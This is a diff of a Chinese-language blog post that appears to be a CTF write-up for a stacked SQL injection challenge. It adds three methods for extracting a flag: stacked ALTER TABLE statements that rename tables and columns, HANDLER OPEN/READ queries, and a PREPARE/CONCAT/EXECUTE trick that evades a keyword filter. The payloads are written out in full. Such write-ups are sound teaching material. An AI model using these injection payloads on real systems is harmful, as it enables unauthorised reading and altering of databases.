@@ -98,13 +98,33 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></he
 <p>输入</p>
 <p>‘;show columns from words;</p>
 <p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201111147277.png" alt="image-20220111114739233"></p>
-<p>显然，flag存在于1919810931114514表中，可以通过修改表名来获取flag</p>
-<p>将表1919810931114514的名字改为words,flag列名字改为id，就能获取flag</p>
+<p>显然，flag存在于1919810931114514表中</p>
+
+        <h3 id="法Ⅰ：可以通过修改表名来获取flag"   >
+          <a href="#法Ⅰ：可以通过修改表名来获取flag" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅰ：可以通过修改表名来获取flag" class="headerlink" title="法Ⅰ：可以通过修改表名来获取flag"></a>法Ⅰ：可以通过修改表名来获取flag</h3>
+      <p>将表1919810931114514的名字改为words,flag列名字改为id，就能获取flag</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">修改表名(将表名user改为users)</span><br><span class="line">alter table user rename to users;</span><br><span class="line"></span><br><span class="line">修改列名(将字段名username改为name)</span><br><span class="line">alter table users change uesrname name varchar(30);</span><br></pre></td></tr></table></div></figure>
 
 <p>即</p>
 <p>‘；alter table words rename to word1;alter table <code>1919810931114514</code> rename to words;alter table words change flag id varchar(50);#</p>
 <p>最后再输入1’ or 1=1#</p>
 <p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201111304918.png" alt="image-20220111130409886"></p>
-<p>OVER</p>
+
+        <h3 id="法Ⅱ：利用open和handler"   >
+          <a href="#法Ⅱ：利用open和handler" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：利用open和handler" class="headerlink" title="法Ⅱ：利用open和handler"></a>法Ⅱ：利用open和handler</h3>
+      <p>输入</p>
+<p>‘;handler <code>1919810931114514</code> open as <code>a</code>;handler <code>a</code> read next;#</p>
+<p>（PS：a可随意变换名称）</p>
+<p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201111450381.png" alt="image-20220111145029306"></p>
+
+        <h3 id="法Ⅲ：MySQL的预处理"   >
+          <a href="#法Ⅲ：MySQL的预处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅲ：MySQL的预处理" class="headerlink" title="法Ⅲ：MySQL的预处理"></a>法Ⅲ：MySQL的预处理</h3>
+      <p>尝试一下输入select</p>
+<p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201111457444.png" alt="image-20220111145750389"></p>
+<p>得出括号里的一堆都被过滤掉了，可以利用预处理机制prepare和concat函数拼接获得select，再用exeute来执行，通过大写绕过</p>
+<p>输入</p>
+<p>‘;PREPARE st from concat(‘sel’,’ect’,  ‘* from <code>1919810931114514</code>‘);EXECUTE st;#</p>
+<p>（PS：括号里前两个单引号的内容合在一起应该是被过滤掉的东西，但必须分开）</p>
+<p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201111505373.png" alt="image-20220111150552285"></p>
+<p>OVER！</p>
 </div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">1</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>John Doe</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
